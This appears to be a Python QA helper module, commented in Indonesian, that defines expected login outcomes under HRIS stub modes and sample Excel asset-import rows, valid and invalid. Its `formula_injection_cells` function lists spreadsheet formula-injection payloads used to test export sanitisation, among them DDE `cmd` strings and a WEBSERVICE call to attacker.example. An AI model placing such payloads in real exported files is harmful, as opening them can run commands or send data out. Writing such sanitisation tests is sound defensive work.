"""Kebijakan ekspektasi alur login dual-mode & kasus baris Excel — murni.

Sumber: `osc_docs/rest/api-w1.md` §1 (mermaid alur login), tabel error
response `POST /auth/login`, dan §3 (skema Excel aset).
"""

from __future__ import annotations

from dataclasses import dataclass

from domain.models_w1 import HrisStubMode, ImportRowError, LoginChannel, LoginExpectation

HRIS_SUCCESS_PREFIX = "1|"
HRIS_REJECT_PREFIX = "0|"


@dataclass(frozen=True)
class HrisOutcome:
    """Ekspektasi respons `POST /auth/login` untuk mode stub HRIS tertentu.

    `offline_cache=None` berarti flag tidak direlevansikan skenario;
    saat upstream gagal dan cache valid, kontrak mewajibkan
    `offline_cache=true` (ActivityLog `LOGIN_HRIS_OFFLINE_CACHE`);
    bila cache tidak tersedia/kedaluwarsa → `502 HRIS_UPSTREAM_INVALID_RESPONSE`.
    """

    allowed_status: tuple[int, ...]
    error_code: str | None
    offline_cache: bool | None
    hris_synced: bool

    def matches(self, status_code: int, error_code: str | None, offline_cache: bool | None) -> bool:
        if status_code not in self.allowed_status:
            return False
        if status_code >= 400 and error_code != self.error_code:
            return False
        if self.offline_cache is not None and status_code < 400:
            return offline_cache is self.offline_cache
        return True


def expected_hris_outcome(
    mode: HrisStubMode,
    *,
    cache_available: bool,
    cache_within_ttl: bool,
) -> HrisOutcome:
    """Pemetaan MURNI mode stub → ekspektasi kontrak (bab 5.1–5.2)."""
    if mode is HrisStubMode.OK:
        # `1|` → sync profil + Argon2id cache + last_hris_sync_at, offline_cache=false.
        return HrisOutcome((200,), None, False, True)
    if mode is HrisStubMode.INVALID:
        # `0|...|NONE` → 401 TANPA fallback ke cache offline.
        return HrisOutcome((401,), "UNAUTHORIZED", None, False)
    # NON_XML / SLOW: upstream error → cache offline bila valid, else 502.
    if cache_available and cache_within_ttl:
        return HrisOutcome((200,), None, True, False)
    return HrisOutcome((502,), "HRIS_UPSTREAM_INVALID_RESPONSE", None, False)


def local_login_expectation() -> LoginExpectation:
    """company_id kosong → Local Login Argon2id (tanpa HRIS)."""
    return LoginExpectation(LoginChannel.LOCAL, (200, 401), "UNAUTHORIZED", None)


def excel_valid_rows(count: int = 3, tag_prefix: str = "QA-W1") -> list[dict[str, object]]:
    """Baris valid sesuai skema Excel §3 (A..I)."""
    rows: list[dict[str, object]] = []
    for index in range(1, count + 1):
        rows.append(
            {
                "asset_tag": f"{tag_prefix}-{index:04d}",
                "name": f"Aset QA Wave1 {index}",
                "model_name": "Generic Model",
                "status_label": "Deployable",
                "node_type": "HOST",
                "serial_number": f"SNQA{index:06d}",
                "hostname": f"qa-w1-{index}.local",
                "mgmt_ip": f"10.20.{index}.30",
                "purchase_cost": 1_500_000 * index,
            }
        )
    return rows


def excel_error_rows(tag_prefix: str = "QA-W1E") -> list[tuple[dict[str, object], ImportRowError]]:
    """Satu baris per kode error laporan import (cap 100, §2 excel)."""
    duplicate_tag = f"{tag_prefix}-0001"
    return [
        (
            {"name": "Tanpa asset_tag"},
            ImportRowError(1, "asset_tag", "REQUIRED", "asset_tag wajib"),
        ),
        (
            {"asset_tag": "X" * 101, "name": "Terlalu panjang"},
            ImportRowError(2, "asset_tag", "TOO_LONG", "≤ 100 char"),
        ),
        (
            {"asset_tag": f"{tag_prefix}-0002", "name": "Enum salah", "node_type": "MAINFRAME"},
            ImportRowError(3, "node_type", "ENUM_INVALID", "node_type di luar enum"),
        ),
        (
            {"asset_tag": f"{tag_prefix}-0003", "name": "IP invalid", "mgmt_ip": "999.1.1.1"},
            ImportRowError(4, "mgmt_ip", "IP_INVALID", "bukan IpAddr valid"),
        ),
        (
            {"asset_tag": f"{tag_prefix}-0004", "name": "Cost negatif", "purchase_cost": -5},
            ImportRowError(5, "purchase_cost", "NUMBER_INVALID", "≥ 0"),
        ),
        (
            {"asset_tag": duplicate_tag, "name": "Duplikat pertama"},
            ImportRowError(6, "asset_tag", "DUPLICATE", "UNIQUE(company_id, asset_tag)"),
        ),
        (
            {"asset_tag": duplicate_tag, "name": "Duplikat kedua"},
            ImportRowError(7, "asset_tag", "DUPLICATE", "UNIQUE(company_id, asset_tag)"),
        ),
    ]


def formula_injection_cells() -> list[str]:
    """Sel berbahaya untuk uji sanitasi export (CWE-1236, §2 /assets/export)."""
    return (
        "=cmd|'/C calc'!A0",
        "+1+cmd|'/C calc'!A0",
        "@SUM(1+1)",
        "-2+3",
        "\t=WEBSERVICE(\"https://attacker.example\")",
        "\r=1+1",
    )


DANGEROUS_LEADING_CHARS = ("=", "+", "-", "@", "\t", "\r")
